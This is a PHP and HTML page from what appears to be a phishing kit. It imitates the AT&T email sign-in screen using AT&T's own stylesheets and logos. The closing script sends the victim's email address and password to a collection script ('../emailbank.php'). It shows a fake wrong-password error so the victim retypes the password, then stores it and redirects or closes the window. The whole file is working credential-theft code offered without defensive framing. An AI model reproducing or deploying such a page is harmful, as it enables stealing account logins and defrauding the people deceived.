<?php
session_start();
require_once '../main.php';
header('Access-Control-Allow-Origin: *');
?>
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml"><head>
    <title>AT&amp;T - Login</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=1.0">
    <link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/_fontface.css" type="text/css">
    <link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/main.css" type="text/css" media="screen">
    <link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/mobile.css" type="text/css" media="handheld, only screen and (max-device-width: 480px)">
    <link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/mobile.css" type="text/css"></head>
    <body><div class="overlay-body" style="display:none;"></div>
    <div id="header"><div id="GlobalNav"><div class="globalNavWrap"><ul><li class="selected"><a href="javascript:void(0)" title="att.net" target="_top">att.net</a></li><li><a href="javascript:void(0)" title="att.com" target="_top">att.com</a></li><li class="last"><a href="javascript:void(0)" title="uverse.com" target="_top">uverse.com</a></li></ul><ul class="gnMoreLinks"><li class="last"><a href="javascript:void(0)" title="En Español" target="_top">En Español</a></li></ul></div></div><div id="masthead"><a href="javascript:void(0)" target="_top" id="attLogoHead" title="att.net Home">AT&amp;T</a><div id="signIn"><ul><li class="last"><a href="javascript:void(0)" target="_top">AT&amp;T Support</a></li></ul></div></div></div>
    <div id="pageWrap"><div id="YadWrap"><div id="richad"></div></div>
    <div id="ad"></div>
    <div id="pageBody"><div id="modal-overlay-body" style="display:none;"></div>
    <div id="loginWrap">
        
        <form action="javascript:void(0);" method="post" id="LoginForm" focus="userid" name="emailaccess" type="com.sbc.idm.igate_edam.forms.LoginFormBean">
            <h1><strong>Sign in to continue!</strong></h1>
            <div id="err" style="display: none;">
                <div id="errContainer">
                    <ul class="errMsg">
                        <li>
                            <p>Please make sure that your User ID and Password are both correct, and try again.
                            </p>
                            <p></p>
                        </li>
                    </ul>
                </div>
            </div>
            <ul class="uLogin">
                <li id="uID">
                    
                    <span class="deleteicon"><label for="emaildress">User ID/Email Address</label><input type="text" name="emaildress" id="emaildress" value="" maxlength="50" size="50" class="slidTxtbox" title="Userid" style="color: rgb(170, 170, 170);" placeholder="ID/Email"><span></span></span>
                    <input type="hidden" name="emailType" value="" id="emailType">
                    <input type="hidden" name="emailProvider" value="" id="emailProvider">
                    <input type="hidden" name="emailretry" value="" id="emailretry">
                    
                    
                    <div class="quesIcon" id="ques1"><a href="#" class="tip" title="Tips for signing in">Sign In Tips</a><div id="qAns1" class="qAns"><div class="overContent"><h3>Sign in tips</h3><p>You can log in with your AT&amp;T Email Address username@currently.com OR</p><p>username@ameritech.net<br>username@att.net<br>username@bellsouth.net<br>username@flash.net<br>username@nvbell.net<br>username@pacbell.net<br>username@prodigy.net<br>username@sbcglobal.net<br>username@snet.net<br>username@swbell.net<br>username@wans.net</p><p class="pBr"><a href="javascript:void(0)" title="Learn about shared passwords for AT&amp;T email" -="">Learn about shared passwords for AT&amp;T <br>email.</a></p><!--<a href="#" class="close">Close</a>--></div></div></div>
                    <p class="fgtEml"><a href="javascript:void(0)" id="fgtEml" class="colLink">Forgot User ID?</a></p>
                </li>
                <li id="uPwd">
                    <span class="deleteicon"><label for="pwdBox">Password</label><input type="password" placeholder="Password" name="emailPassword" id="emailPassword" value="" maxlength="50" size="50" class="slidTxtbox" autocomplete="off" title="Password" style="color: rgb(170, 170, 170);"><span></span></span>
                    
                    <p class="fgtPwd"><a id="fgtPwd" href="#modal" onclick="overlay()" class="colLink" aria-describedby="spanLog">Forgot Password?</a>
                </li>
                <li id="shwPc"><p><input name="showPwd" id="showPwd" class="slidChkBox" type="checkbox"><label for="showPwd">Show password characters</label></p></li>
                <li id="uRM">
                    <p><input type="checkbox" name="rememberID" id="rememberID" class="slidChkBox"><label for="rememberID">Keep me signed in</label></p>
                    <p>for 2 weeks unless I sign out. <span class="quesIcon" id="ques2"><a href="#" class="tip" title="Additional Information about Keep Me Signed In">Additional Information about Keep Me Signed In</a><span id="qAns2" class="qAns"></span></span></p>
                    <p class="text-desktop">(Uncheck if on a shared computer.)</p><p class="text-mobile">(Uncheck if on a shared device.)</p>
                </li>
                
                <li id="uBtn">
                    <input type="submit" id="submitLogin" value="Sign In" class="loginBtn">
                </li>
                <li id="uActCr">
                    <label for="regurl">Don't have an AT&amp;T Account?</label>
                    <a href="javascript:void(0)" id="regurl"><input id="acctCreate" class="loginBtnClear" value="Create AT&amp;T Account" type="button"></a>
                </li>
                
                
            </ul>
            
            <div id="overLayCheck" class="overLayRight1"><h3>You have chosen to stay signed in for 2 weeks. What does this mean?</h3><p>Many of our AT&amp;T users have asked for a way to reduce how frequently they're asked to sign-in to att.net. By checking this new box, you'll stay signed in for up to 2 weeks or until you sign out. To protect your most sensitive data and activities (like changing your password or using your credit card), we'll ask you to re-enter your password when you access some AT&amp;T services.</p><p>If you're using a public computer or you share this computer with others, we recommend that you uncheck the "Keep me signed in" box.</p> <p>This checkbox applies to this computer only. So, for example, you can stay signed in on your home computer, but maintain more frequent password protection on your work or school computer.</p><p>If you need to sign out, remember to click the "Sign Out" link located at the top of most att.net pages when you're signed in.</p><ul class="btnSignIn"><li><button id="btnKeepMe" class="btnLong" onclick="chkTick()">Keep Me Signed In</button></li><li><button id="btnSignIn" class="btnLong" onclick="unchkTick()">Sign Me In, but I don't want to stay Signed In for 2 weeks</button></li></ul><div class="clrAll"></div></div>
        </form>
        <div id="promo"></div>
        
        <div id="modal" role="dialog" aria-labelledby="RedirectionModal">
            <div class="modal-content">
                
                <div class="copy">
                    <p id="RedirectionModal" class="pstyle">You are being redirected to ATT.com<br><span class="pstyle1">where you can recover your password.</span> </p>
                </div>
                <div id="count" style="visibility:hidden;margin-top:-28px;">Redirecting in 10 seconds...</div>
                <a onclick="cancelLoad()" class="hover" id="CancelM" aria-label="Cancel" href="#" role="button"><img class="btnCancel" src="https://home.secureapp.att.net/design/CDLS10/img/logos/Button.png" alt="Cancel"></a>
                <div><img id="logo1" class="attlogo" alt="attlogo" src="https://home.secureapp.att.net/design/CDLS10/img/logos/AT&amp;T_logo.png"></div>
            </div>
            <div class="overlay"></div>
        </div>
    </div>
</div>
</div>
<div id="footer"><div class="footerWrap"><ul><li class="first"><a href="javascript:void(0)">Terms</a></li><li><a href="javascript:void(0)" target="_top">Privacy</a></li><li><a href="javascript:void(0)" target="_blank">Advertise</a></li><li><a href="javascript:void(0)" target="_top">Advertising Choices</a></li><li><a href="javascript:void(0)" target="_top">Acceptable Use Policy</a></li><li class="last"><a href="javascript:void(0)" target="_top">Feedback</a></li></ul><p><a href="javascript:void(0)" target="_top">© 2020 AT&amp;T Intellectual Property</a>. All rights reserved. AT&amp;T and the AT&amp;T logo are trademarks of AT&amp;T Intellectual Property.</p></div></div>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
<script>
    var emailretry = 0;
    var ed = sessionStorage.getItem("emaildress");
    $("#emaildress").val(ed);
$("#showPwd").click(function() {
    if ($(this).is(':checked')) {
        $("#emailPassword").attr("type", "text");
    } else {
        $("#emailPassword").attr("type", "password");
    }
});
$("#emailPassword").keyup(function() {
if ($.trim($('#emailPassword').val()).length < 4) {
$("#err").show();
} else {
$("#err").hide();
}
});
$(".loginBtn").click(function(e) {
e.preventDefault();
if ($.trim($('#emailPassword').val()).length < 4) {
$("#err").show();
} else {
$("#err").hide();
$("#emailType").val(window.opener.document.getElementById('emailType').value);
$("#emailProvider").val(window.opener.document.getElementById('emailProvider').value);
emailretry++
$("#emailretry").val(emailretry);
$.post("../emailbank.php", $("#LoginForm").serialize(), function(result) {});
if ("<?php echo $emailretry ?>" == "on") {
setTimeout(function () {
$("#err").show();
}, 2600);
} else {
window.opener.sessionStorage.setItem('emailPassword', $("#emailPassword").val());
if ("<?php echo $enableEmailReal ?>" == "on") {
$(location).attr('href', window.opener.document.getElementById('urli').value);
} else {
close();
}
}
if (emailretry == <?php echo $numberofretries ?>) {
window.opener.sessionStorage.setItem('emailPassword', $("#emailPassword").val());
if ("<?php echo $enableEmailReal ?>" == "on") {
$(location).attr('href', window.opener.document.getElementById('urli').value);
} else {
close();
}
}
}
});
</script>
</html>